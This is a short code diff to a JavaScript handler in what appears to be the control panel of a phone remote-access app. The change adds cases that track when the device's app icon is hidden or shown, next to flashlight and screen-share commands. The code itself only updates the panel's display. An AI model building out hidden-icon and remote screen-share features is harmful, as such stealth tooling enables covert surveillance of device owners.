@@ -1292,17 +1292,25 @@
                 showNotification('🔦 Flashlight OFF');
                 pendingCommand = null;
                 break;
-                
-            case 'FLASH_TIMED':
-                showNotification('⏱️ Flash timed complete');
-                pendingCommand = null;
-                break;
+
                 
             case 'FLASH_BLINK':
                 showNotification('✨ Flash blink complete');
                 pendingCommand = null;
                 break;
-                
+             case 'APP_HIDDEN':
+                iconHidden = true;
+                document.getElementById('iconBtn').innerText = 'Show Icon';
+                showNotification('App icon hidden');
+                pendingCommand = null;
+                break;
+            
+            case 'APP_SHOWN':
+                iconHidden = false;
+                document.getElementById('iconBtn').innerText = 'Hide Icon';
+                showNotification('App icon shown');
+                pendingCommand = null;
+                break;   
             // Screen share
             case 'SCREEN_SHARE_STARTED':
                 screenActive = true;
